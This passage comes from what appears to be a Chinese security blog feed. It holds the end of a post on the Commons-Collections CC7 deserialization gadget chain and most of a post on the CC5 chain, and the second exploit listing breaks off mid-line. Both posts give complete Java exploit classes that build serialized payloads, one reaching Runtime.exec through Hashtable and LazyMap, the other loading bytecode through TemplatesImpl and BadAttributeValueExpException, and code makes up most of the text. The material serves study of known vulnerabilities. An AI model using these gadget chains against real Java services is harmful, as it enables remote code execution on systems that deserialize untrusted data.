<code>"zZ".hashCode() == "yy".hashCode()</code> 可以利用这一点进入到 equals</p><p>接下来去看一下如何调用 LazyMap 的 equals</p><p>跟进 LazyMap 中发现其并没有实现该类，查看其父类 AbstractMapDecorator</p><p><img src="/../../../../../pic/image-20230128225355812.png"></p><p>这里的 map 是我们传入 LazyMap 中的 HashMap，HashMap 没有实现 hashCode ，查看其父类 AbstractMap</p><p><img src="/../../../../../pic/image-20230128225915540.png"></p><p>可以在此处调用 get 方法</p><p>加上 LazyMap 基本上链子比较清楚了</p><pre class="line-numbers language-none"><code class="language-none">java.util.Hashtable.readObjectjava.util.Hashtable.reconstitutionPutorg.apache.commons.collections.map.AbstractMapDecorator.equalsjava.util.AbstractMap.equalsorg.apache.commons.collections.map.LazyMap.getorg.apache.commons.collections.functors.ChainedTransformer.transformorg.apache.commons.collections.functors.InvokerTransformer.transformjava.lang.reflect.Method.invokesun.reflect.DelegatingMethodAccessorImpl.invokesun.reflect.NativeMethodAccessorImpl.invokesun.reflect.NativeMethodAccessorImpl.invoke0java.lang.Runtime.exec<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-CC7-链-EXP-编写"><a href="#4-CC7-链-EXP-编写" class="headerlink" title="4. CC7 链 EXP 编写"></a>4. CC7 链 EXP 编写</h2><ul><li>Exploit</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">{</span>        <span class="token comment">// 调用 Runtime 进行命令执行</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment">// 在 put 时会触发 hashCode,因此先写入一个空值，后面通过反射修改</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// lazyMap1</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> lazyMap1 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap1<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        lazyMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// lazyMap2</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> lazyMap2 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap2<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        lazyMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 写入 lazyMap1 与 lazyMap2</span>        <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>lazyMap2<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 在 put 后会把对应的键值对写入 LazyMap</span>        <span class="token comment">// 清除 put 后对 lazyMap 的影响，确保进入 transform</span>        lazyMap2<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 修改为正确值</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span> <span class="token string">"iTransformers"</span><span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 执行序列化与反序列化</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashtable<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayInputStream</span> byteArrayInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>byteArrayInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">{</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5. 参考链接"></a>5. 参考链接</h2><p><a href="https://github.com/frohoff/ysoserial">ysoserial</a></p>]]></content>
      
      
      <categories>
          
          <category> Java 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC 链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 反序列化 Commons-Collections 篇 CC5 链</title>
      <link href="/2023/01/28/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc5-lian/"/>
      <url>/2023/01/28/skilllearning/java-an-quan/java-fan-xu-lie-hua/commons-collections-pian/java-fan-xu-lie-hua-commons-collections-pian-cc5-lian/</url>
      
        <content type="html"><![CDATA[<h1 id="Java-反序列化-Commons-Collections-篇-CC5-链"><a href="#Java-反序列化-Commons-Collections-篇-CC5-链" class="headerlink" title="Java 反序列化 Commons-Collections 篇 CC5 链"></a>Java 反序列化 Commons-Collections 篇 CC5 链</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>CC1、CC3、CC6链都使用了 LazyMap.get() 方法，到了 CC5 依旧是利用 LazyMap.get() </p><h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><ul><li>java8u65</li><li>commons-collections4.0</li><li>Maven 3.8.7</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.commons<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-collections4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-CC5-链分析"><a href="#3-CC5-链分析" class="headerlink" title="3. CC5 链分析"></a>3. CC5 链分析</h2><p>在 CC6 中使用的 TiedMapEntry + HashMap 来调用 LazyMap.get()，这里再回去看一下 TiedMapEntry</p><p><img src="/../../../../../pic/image-20230128155925346.png"></p><p>toString() 方法中也可以进一步调用 LazyMap.get()</p><p>为了调用这里的 toString 方法引入一个新类 BadAttributeValueExpException</p><p><img src="/../../../../../pic/image-20230128164032979.png"></p><p>在 readObject 中调用了 toString 方法而且没啥利用难度</p><h2 id="4-CC5-链编写-EXP"><a href="#4-CC5-链编写-EXP" class="headerlink" title="4. CC5 链编写 EXP"></a>4. CC5 链编写 EXP</h2><ul><li>Exploit</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 绕过 if 确保进入</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_class"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 写入字节码</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:/Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">LazyMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">lazyMap</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BadAttributeValueExpException</span> badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span> <span class="token string">"val"</span><span class="token punctuation">,</span> tiedMapEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 序列化</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 反序列化</span>        <span class="token class-name">ByteArrayInputStream</span> byteArrayInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token 